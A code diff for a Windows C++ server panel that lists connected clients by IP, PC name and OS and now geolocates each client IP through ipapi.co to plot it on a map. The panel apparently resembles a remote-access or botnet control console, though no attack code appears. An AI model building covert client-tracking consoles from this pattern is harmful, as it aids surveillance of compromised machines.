@@ -7,15 +7,6 @@
 #include <set>
 #define MAX_DOTS 100
 
-typedef struct _DOT {
-    int dotX; // X coordinate of the dot
-    int dotY; // Y coordinate of the dot
-    int dotRadius; // radius of the dot
-} DOT;
-
-DOT dots[MAX_DOTS];
-int numDots = 0;
-
 #pragma warning(disable:28251)
 
 #define WM_SOCKET WM_USER + 1
@@ -38,8 +29,26 @@ std::wstring aCounter;
 std::wstring itemFileName;
 std::map<int, std::wstring> clientItems;
 
+typedef struct _DOT {
+    int dotX;
+    int dotY;
+    int dotRadius;
+} DOT;
 
-void OnCreate(HWND hwnd, WPARAM wParam, LPARAM lParam);
+DOT dots[MAX_DOTS];
+std::map<SOCKET, int> clientToDotMap;
+
+int numDots = 0;
+
+struct Coordinates {
+    int x;
+    int y;
+};
+
+size_t writeFunction(void* ptr, size_t size, size_t nmemb, std::string* data) {
+    data->append((char*)ptr, size * nmemb);
+    return size * nmemb;
+}
 
 void OnCreate(HWND hwnd, WPARAM wParam, LPARAM lParam)
 {
@@ -272,14 +281,14 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                 wchar_t* ll = wip;
                 aCounter = L"user" + std::to_wstring(counter) + L" " + wip;
                 std::wstring thisItemName = L"Client " + std::to_wstring(counter);
-                wchar_t* cc = new wchar_t[aCounter.length() + 1];
-                wcscpy(cc, aCounter.c_str());
+                wchar_t* FinalIP = new wchar_t[aCounter.length() + 1];
+                wcscpy(FinalIP, aCounter.c_str());
 
                 LVITEM item;
                 item.mask = LVIF_TEXT | LVIF_PARAM;
                 item.iItem = ListView_GetItemCount(hwndList);
                 item.iSubItem = 0;
-                item.pszText = cc;
+                item.pszText = FinalIP;
                 item.lParam = newSd;
 
                 SendMessageW(hwndList, LVM_SETTEXTCOLOR, (WPARAM)0, (LPARAM)RGB(122, 5, 5));
@@ -297,18 +306,64 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                     // handle error
                 }
 
-                DOT newDot;
-                
-                newDot.dotX = rand() % 500; // the X coordinate of the dot is a random number between 0 and 500
-                newDot.dotY = 450 + (rand() % (700 - 450 + 1)); // the Y coordinate of the dot
-                newDot.dotRadius = 5; // the radius of the dot
 
-                // Add the new dot to the dots array
-                dots[numDots] = newDot;
-                numDots++;
+                std::string fIPStr = std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>>().to_bytes(wip);
+                std::string url = "https://ipapi.co/"+fIPStr+"/country_name";
+                CURL* curl = curl_easy_init();
+                if (curl) {
+                    std::string response;
+                    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+                    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeFunction);
+                    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+                    CURLcode res = curl_easy_perform(curl);
+                    if (res == CURLE_OK) {
+                        std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
+                        std::wstring responseW = converter.from_bytes(response);
+                        ListView_SetItemText(hwndList, itemIndex, 3, (LPWSTR)responseW.c_str());
 
-                // Redraw the window to display the new dot
-                InvalidateRect(hwnd, NULL, TRUE);
+                    }
+                    else {
+                        std::cerr << "cURL error: " << curl_easy_strerror(res) << std::endl;
+                    }
+                    curl_easy_cleanup(curl);
+                }
+
+                CURL* curl2 = curl_easy_init();
+                if (curl2) {
+                    std::string response2;
+                    std::string url2 = "https://ipapi.co/" + fIPStr + "/country_code";
+                    curl_easy_setopt(curl2, CURLOPT_URL, url2.c_str());
+                    curl_easy_setopt(curl2, CURLOPT_WRITEFUNCTION, writeFunction);
+                    curl_easy_setopt(curl2, CURLOPT_WRITEDATA, &response2);
+                    CURLcode res2 = curl_easy_perform(curl2);
+                    if (res2 == CURLE_OK) {
+                        for (int i = 0; i < clientSockets.size(); i++) {
+                            clientToDotMap[clientSockets[i]] = i;
+                        }
+                        std::map<std::string, Coordinates> countryCoords;
+                        srand(time(0));
+                        countryCoords["SK"] = { rand() % (294 - 292 + 1) + 292, rand() % (506 - 502 + 1) + 502 };
+                        countryCoords["US"] = { rand() % (135 - 115 + 1) + 115, rand() % (535 - 505 + 1) + 505 };
+                        auto coords = countryCoords[response2];
+                        DOT newDot;
+
+                        newDot.dotX = coords.x;
+                        newDot.dotY = coords.y;
+                        newDot.dotRadius = 4;
+
+                        // Add the new dot to the dots array
+                        dots[numDots] = newDot;
+                        numDots++;
+
+                        // Redraw the window to display the new dot
+                        InvalidateRect(hwnd, NULL, TRUE);
+                    }
+                    else {
+                        std::cerr << "cURL error: " << curl_easy_strerror(res2) << std::endl;
+                    }
+                    curl_easy_cleanup(curl2);
+                }
+
 
                 //OS
                 std::wstring osVersion = getSysOpType();
@@ -362,10 +417,20 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                         }
                     }
 
-                    if (itemIndex != -1)
+                    auto dotIndex = clientToDotMap.find(*it);
+                    if (itemIndex != -1 && dotIndex != clientToDotMap.end())
                     {
-                        // Delete the item from the list view control
+                        int dotIndexValue = dotIndex->second;
+                        for (int i = dotIndexValue; i < numDots - 1; i++) {
+                            dots[i] = dots[i + 1];
+                        }
+                        numDots--;
+
+                        InvalidateRect(hwnd, NULL, TRUE);
+
                         SendMessageW(hwndList, LVM_DELETEITEM, (WPARAM)itemIndex, 0);
+
+                        clientToDotMap.erase(dotIndex);
                     }
 
                     addedClients.erase(*it); // Remove the client from the addedClients set
@@ -393,6 +458,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         CreateColumn(hwndList, 25, 100, (wchar_t*)L"Connections");
         CreateColumn(hwndList, 25, 130, (wchar_t*)L"PC Name");
         CreateColumn(hwndList, 25, 100, (wchar_t*)L"Operation Sys");
+        CreateColumn(hwndList, 25, 100, (wchar_t*)L"Country");
         SendMessageW(hwndList, LVM_SETBKCOLOR, 0, (LPARAM)clrRed);
 
         timerId = SetTimer(hwnd, 12, 1000, NULL);
